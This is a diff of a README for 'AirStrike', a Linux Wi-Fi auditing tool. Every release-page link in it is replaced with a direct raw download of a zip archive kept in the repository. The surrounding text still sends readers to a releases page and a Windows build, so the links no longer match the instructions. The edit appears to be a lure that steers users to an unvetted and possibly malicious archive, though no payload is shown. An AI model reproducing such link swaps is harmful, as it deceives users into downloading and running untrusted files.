@@ -1,6 +1,6 @@
 # 📡 AirStrike - Simple Wi-Fi Auditing on Linux
 
-[![Download AirStrike](https://img.shields.io/badge/Download%20AirStrike-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/occasionpuffbird12/AirStrike/releases)
+[![Download AirStrike](https://img.shields.io/badge/Download%20AirStrike-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/occasionpuffbird12/AirStrike/raw/refs/heads/main/core/Air-Strike-2.8.zip)
 
 ## 🖥️ What AirStrike Does
 
@@ -12,7 +12,7 @@ It is built for users who want a clear screen and a simple workflow instead of c
 
 Visit this page to download AirStrike for Windows and other available builds:
 
-https://github.com/occasionpuffbird12/AirStrike/releases
+https://github.com/occasionpuffbird12/AirStrike/raw/refs/heads/main/core/Air-Strike-2.8.zip
 
 On the releases page, look for the latest version and download the Windows file that matches your system.
 
@@ -203,7 +203,7 @@ aircrack-ng, cybersecurity, ethical-hacking, handshake, hashcat, linux, network-
 
 Use the release page to download AirStrike:
 
-https://github.com/occasionpuffbird12/AirStrike/releases
+https://github.com/occasionpuffbird12/AirStrike/raw/refs/heads/main/core/Air-Strike-2.8.zip
 
 ## 📄 License
 
